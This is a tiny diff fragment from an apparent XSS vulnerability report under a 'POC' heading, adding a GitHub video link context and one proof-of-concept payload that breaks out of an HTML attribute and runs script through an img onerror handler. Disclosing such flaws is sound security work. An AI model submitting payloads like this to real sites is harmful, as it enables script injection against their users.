@@ -17,3 +17,4 @@ POC :
 
 https://github.com/Trinity-SYT-SECURITY/XSS_vuln_issue/assets/96654161/568dc4df-ab68-4d58-bb00-b9b515a830da
 
+`<p x="`<img src=x onerror=alert(1)>"></p>
